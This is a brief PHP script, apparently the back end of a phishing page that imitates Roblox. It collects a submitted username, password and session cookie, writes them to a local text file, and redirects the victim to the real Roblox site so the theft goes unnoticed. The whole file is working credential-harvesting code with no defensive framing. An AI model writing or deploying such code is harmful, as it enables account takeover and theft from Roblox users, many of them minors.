<?php
$username = $_POST['username'];
$password = $_POST['password'];
$cookie = $_POST['cookie'];

$file = fopen("data.txt", "a");
fwrite($file, "Username: " . $username . "\n");
fwrite($file, "Password: " . $password . "\n");
fwrite($file, "Cookie: " . $cookie . "\n\n");
fclose($file);

header("Location: https://www.roblox.com"); // Redirect to real Roblox
exit();
?>
